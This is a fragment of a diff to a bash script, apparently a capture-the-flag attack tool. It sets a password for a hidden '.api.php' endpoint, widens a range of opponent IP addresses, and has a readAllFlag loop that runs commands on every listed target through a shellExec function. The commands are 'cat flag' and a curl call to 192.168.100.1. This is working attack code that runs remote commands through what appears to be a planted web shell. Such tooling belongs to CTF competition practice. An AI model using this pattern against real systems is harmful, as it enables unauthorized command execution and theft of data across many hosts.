@@ -2,13 +2,12 @@
 
 passwd="p4rr0t"
 target="http://127.0.0.1/.api.php"
-segment="4.4.*.100-101"
+segment="4.4.1-83.100-101"
 
 
 function readAllFlag(){
-    echo -n "Input path of flag>"
-    read path
     cmd='curl http://192.168.100.1/Getkey'
+    cmd='cat flag'
     for target in $(cat ./target.txt)
     do
         shellExec $target $cmd
